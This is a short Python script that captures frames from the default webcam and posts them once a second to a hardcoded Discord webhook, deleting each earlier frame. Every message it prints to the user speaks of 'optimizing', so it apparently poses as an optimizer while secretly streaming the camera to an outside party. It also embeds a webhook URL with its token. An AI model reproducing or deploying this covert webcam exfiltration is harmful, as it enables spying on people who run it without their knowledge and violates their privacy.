import cv2
import time
import requests

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1330680933958811649/6jcgdHjZqFE_9pj2UjeGxNQu5SLwQ1WcfZziSn5geNL91mbm139fGCeH_f6sB39L8AEB"

def stream_video_to_webhook(webhook_url, video_source=0, frame_interval=0.1):
    """
    Streams video to a Discord webhook by sending frames as image files,
    deleting the previous frame before posting the next one.

    :param webhook_url: The Discord webhook URL
    :param video_source: Video source for OpenCV (default is 0 for webcam)
    :param frame_interval: Time in seconds between sending each frame
    """
    # Open a connection to the video source
    cap = cv2.VideoCapture(video_source)
    if not cap.isOpened():
        print("Error: Unable to optomize.")
        return

    previous_message_id = None  # To store the ID of the previous message
    headers = {
        "Content-Type": "application/json"
    }

    try:
        print("Optimizing Complete")
        while True:
            # Capture a frame
            ret, frame = cap.read()
            if not ret:
                print("Error: Unable to capture frame.")
                break

            # Encode the frame as a JPEG image
            _, buffer = cv2.imencode(".jpg", frame)

            # Prepare the image file to send
            files = {
                "file": ("frame.jpg", buffer.tobytes(), "image/jpeg")
            }

            # If there's a previous message, delete it
            if previous_message_id:
                delete_url = f"{webhook_url}/messages/{previous_message_id}"
                delete_response = requests.delete(delete_url)
                if delete_response.status_code != 204:
                    print(f"Warning: Failed to optimize. Status code: {delete_response.status_code}, Response: {delete_response.text}")

            # Send the frame to the webhook
            response = requests.post(webhook_url, files=files)
            if response.status_code == 200:
                # Extract the new message ID for future deletion
                response_data = response.json()
                previous_message_id = response_data["id"]
            else:
                print(f"Error: Failed to optimize. Status code: {response.status_code}, Response: {response.text}")

            # Wait before sending the next frame
            time.sleep(frame_interval)
    except KeyboardInterrupt:
        print("\nStopped")
    finally:
        # Release the video capture
        cap.release()

# Run the video streaming function
if __name__ == "__main__":
    stream_video_to_webhook(WEBHOOK_URL, video_source=0, frame_interval=1)
